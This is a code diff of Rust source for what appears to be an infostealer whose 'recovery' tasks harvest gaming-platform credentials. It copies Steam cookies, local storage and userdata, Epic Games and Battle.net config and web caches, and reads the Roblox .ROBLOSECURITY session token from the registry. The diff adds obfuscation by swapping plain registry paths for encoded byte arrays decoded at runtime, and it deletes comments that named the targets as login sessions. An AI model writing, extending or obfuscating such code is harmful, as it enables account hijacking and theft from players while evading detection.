@@ -1,3 +1,4 @@
+use crate::recovery::helpers::obfuscation::deobf;
 use crate::recovery::{
     context::RecoveryContext,
     fs::{copy_dir_limited, copy_file, copy_named_dir, sanitize_label},
@@ -76,8 +77,7 @@ impl RecoveryTask for SteamTask {
         let mut artifacts = Vec::new();
         if let Some(steam_path) = query_steam_path() {
             let dest = gaming_output_dir(ctx, &self.label()).await?;
-            
-            // 1. Grab .vdf config files (Session & User info)
+
             let config_dir = steam_path.join("config");
             copy_files_by_predicate(
                 &self.label(),
@@ -85,24 +85,38 @@ impl RecoveryTask for SteamTask {
                 &dest.join("config"),
                 |name| name.ends_with(".vdf"),
                 &mut artifacts,
-            ).await?;
+            )
+            .await?;
 
-            // 2. Grab browser cache/cookies (Active login sessions)
             let html_cache = config_dir.join("htmlcache");
             if html_cache.exists() {
-                // Grab Cookies and Local Storage
                 for target in ["Cookies", "Local Storage", "IndexedDB"] {
                     let source = html_cache.join(target);
                     if source.exists() {
-                        let _ = copy_dir_limited(&source, &dest.join("htmlcache").join(target), &self.label(), &mut artifacts, 3, 100).await;
+                        let _ = copy_dir_limited(
+                            &source,
+                            &dest.join("htmlcache").join(target),
+                            &self.label(),
+                            &mut artifacts,
+                            3,
+                            100,
+                        )
+                        .await;
                     }
                 }
             }
 
-            // 3. User-specific configs
             let userdata = steam_path.join("userdata");
             if userdata.exists() {
-                let _ = copy_dir_limited(&userdata, &dest.join("userdata"), &self.label(), &mut artifacts, 4, 200).await;
+                let _ = copy_dir_limited(
+                    &userdata,
+                    &dest.join("userdata"),
+                    &self.label(),
+                    &mut artifacts,
+                    4,
+                    200,
+                )
+                .await;
             }
         }
 
@@ -125,14 +139,20 @@ impl RecoveryTask for EpicGamesTask {
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let dest = gaming_output_dir(ctx, &self.label()).await?;
         let mut artifacts = Vec::new();
-        
-        // Target high-value directories
+
         for folder in ["Config", "Data", "WebCache"] {
             let source = self.0.join(folder);
             if fs::metadata(&source).await.is_ok() {
-                // Limit depth for WebCache to avoid excessive size
                 let depth = if folder == "WebCache" { 3 } else { 5 };
-                let _ = copy_dir_limited(&source, &dest.join(folder), &self.label(), &mut artifacts, depth, 500).await;
+                let _ = copy_dir_limited(
+                    &source,
+                    &dest.join(folder),
+                    &self.label(),
+                    &mut artifacts,
+                    depth,
+                    500,
+                )
+                .await;
             }
         }
         Ok(artifacts)
@@ -179,15 +199,29 @@ impl RecoveryTask for BattleNetTask {
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut artifacts = Vec::new();
         let dest = gaming_output_dir(ctx, &self.label()).await?;
-        
-        // 1. Roaming data (Accounts & Config)
+
         if self.roaming.exists() {
-            let _ = copy_dir_limited(&self.roaming, &dest.join("Roaming"), &self.label(), &mut artifacts, 5, 500).await;
+            let _ = copy_dir_limited(
+                &self.roaming,
+                &dest.join("Roaming"),
+                &self.label(),
+                &mut artifacts,
+                5,
+                500,
+            )
+            .await;
         }
 
-        // 2. Local data (Web Cache & Cookies)
         if self.local.exists() {
-             let _ = copy_dir_limited(&self.local, &dest.join("Local"), &self.label(), &mut artifacts, 3, 500).await;
+            let _ = copy_dir_limited(
+                &self.local,
+                &dest.join("Local"),
+                &self.label(),
+                &mut artifacts,
+                3,
+                500,
+            )
+            .await;
         }
 
         Ok(artifacts)
@@ -235,7 +269,12 @@ where
 
 fn query_steam_path() -> Option<PathBuf> {
     let hive = RegKey::predef(HKEY_CURRENT_USER);
-    hive.open_subkey(r"Software\Valve\Steam")
+    // "Software\\Valve\\Steam"
+    let steam_key_path = deobf(&[
+        0x90, 0xD2, 0xDB, 0xC9, 0xCA, 0xDC, 0xCF, 0xD8, 0xE1, 0x95, 0xDC, 0xD1, 0xC5, 0xD8, 0xE1,
+        0x90, 0xCD, 0xD8, 0xDC, 0xCD,
+    ]);
+    hive.open_subkey(steam_key_path)
         .ok()
         .and_then(|key| key.get_value::<String, _>("SteamPath").ok())
         .map(PathBuf::from)
@@ -456,14 +495,21 @@ struct RobloxTask;
 
 impl RobloxTask {
     fn collect_tokens() -> Vec<(String, String)> {
-        const REGISTRY_PATH: &str = r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com";
+        // "SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com"
+        let reg_path_str = deobf(&[
+            0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x91, 0xD2, 0xDF, 0xDB, 0xD2,
+            0xDB, 0xE1, 0x91, 0xD2, 0xDF, 0xDB, 0xD2, 0xDB, 0x90, 0xCD, 0xCC, 0xD3, 0xD4, 0xD2,
+            0xF1, 0xCB, 0xD2, 0xCE, 0xCE, 0xD8, 0xCF, 0xE1, 0xCF, 0xD2, 0xDB, 0xDB, 0xD2, 0xDB,
+            0x93, 0xCE, 0xD2, 0xCD,
+        ]);
+        let reg_path = &reg_path_str;
         const VALUE_NAME: &str = ".ROBLOSECURITY";
         const SOURCES: [(&str, HKEY); 2] =
             [("HKCU", HKEY_CURRENT_USER), ("HKLM", HKEY_LOCAL_MACHINE)];
 
         let mut results = Vec::new();
         for (label, hive) in SOURCES {
-            if let Some(value) = read_registry_value(hive, REGISTRY_PATH, VALUE_NAME) {
+            if let Some(value) = read_registry_value(hive, reg_path, VALUE_NAME) {
                 let trimmed = value.trim();
                 if !trimmed.is_empty() {
                     results.push((label.to_string(), trimmed.to_string()));
